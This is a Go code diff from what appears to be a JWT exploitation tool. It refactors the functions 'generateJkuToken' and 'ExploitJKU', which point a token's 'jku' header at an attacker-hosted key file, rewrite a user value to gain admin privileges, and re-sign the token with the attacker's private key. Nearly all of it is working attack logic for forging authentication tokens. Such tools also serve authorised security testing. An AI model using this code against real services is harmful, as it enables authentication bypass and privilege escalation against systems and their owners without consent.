@@ -19,7 +19,7 @@ func launchServer(port int) {
 	http.ListenAndServe(":"+strconv.Itoa(port), nil)
 }
 
-func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url string) (string, error) {
+func generateJkuToken(token *jwt.Token, url string) (string, error) {
 
 	tokenCpy := ctrl.CloneToken(token)
 	alg := tokenCpy.Header["alg"].(string)
@@ -43,6 +43,10 @@ func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url
 	}
 
 	//Change the value of the "JKU" header to set the path to our file containing our private key
+
+	if url[len(url)-1] != '/' {
+		url += "/"
+	}
 	newToken, err := ctrl.ChangeValue(tokenCpy, "jku", url+pathToFile, true)
 	if err != nil {
 		return "", err
@@ -50,11 +54,9 @@ func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url
 
 	//If the "user" header has been found
 	//Change the value of the header to create a token with admin privs
-	if userHeader != "" {
-		newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
-		if err != nil {
-			return "", err
-		}
+	newToken, err = ChangeUserValue(newToken)
+	if err != nil {
+		return "", err
 	}
 
 	//Sign the token with our private key
@@ -66,9 +68,9 @@ func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url
 	return newJWT, nil
 }
 
-func ExploitJKU(token *jwt.Token, userHeader, userValue, url string, server bool) (string, error) {
+func ExploitJKU(token *jwt.Token, url string, server bool) (string, error) {
 
-	newJWT, err := generateJkuToken(token, userHeader, userValue, url)
+	newJWT, err := generateJkuToken(token, url)
 	if err != nil {
 		return "", err
 	}
